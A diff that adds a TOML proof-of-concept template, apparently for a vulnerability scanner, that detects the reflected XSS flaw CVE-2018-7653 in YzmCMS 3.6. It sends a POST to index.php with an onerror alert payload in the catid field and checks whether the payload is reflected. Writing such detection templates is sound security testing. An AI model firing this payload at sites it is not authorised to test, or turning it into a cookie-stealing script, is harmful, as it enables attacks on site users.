@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "YzmCMS 3.6 版本 index.php 页面中 m、c、a 参数存在反射型 XSS 漏洞，攻击者可通过构造包含恶意 HTML/JavaScript 的 URL 参数，诱使已登录用户点击，在用户浏览器上下文中执行任意脚本。"
+id = "POC-AVE-2018-0201"
+name = "YzmCMS 3.6 跨站脚本漏洞 PoC"
+severity = "medium"
+tags = ["ave-2018-0201"]
+vuln_id = [
+    "CVE-2018-7653",
+    "AVE-2018-0201",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "m=search&c=index&a=listing&catid=1<img src=a onerror=alert(document.domain)>"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=a onerror=alert(document.domain)>"]
